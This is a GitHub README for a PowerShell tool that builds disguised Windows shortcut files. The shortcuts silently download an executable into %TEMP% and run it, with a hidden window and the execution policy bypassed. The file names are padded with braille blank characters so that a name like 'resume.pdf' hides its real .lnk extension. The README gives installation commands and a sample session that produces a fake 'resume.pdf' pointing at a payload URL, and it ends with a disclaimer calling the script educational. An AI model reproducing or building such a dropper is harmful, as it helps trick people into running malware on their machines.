# Shortcut to PowerShell

A quick, clean way to create a **Windows shortcut (.lnk)** that launches **PowerShell** with custom options (hidden window, bypass execution policy, etc.).

features :

1. hidden extension
2. using braille spacetype to hide the original .lnk
3. silent execution


## installation

```s
git clone https://github.com/00nx/shortcut2powershell.git
```

```s
cd shortcut2powershell
```

```s
./main.ps1
```

## usage 

```s
Enter the download URL (required): https://example.com/download
Enter shortcut base name (optional, press Enter for 'video'): resume
Spoof extension with braille spaces? (y/n, default n): y
Enter fake extension (e.g. mp4, pdf, mp3, png, jpg, txt): pdf

SUCCESS! Spoofed shortcut created
Visible name : resume.pdf       t
Real file    : resume.pdf⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀t.lnk
Full path    : C:\home\projects\lnkgrabber\resume.pdf⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀t.lnk
Icon         : Generic blank file icon (./image.ico not found)

Payload URL : https://example.com/download
Temp file   : szVUAcZROk.exe (in %TEMP%)
```

> [!CAUTION]
> this is just an educational script and never meant to harm any system, use it with your own risk

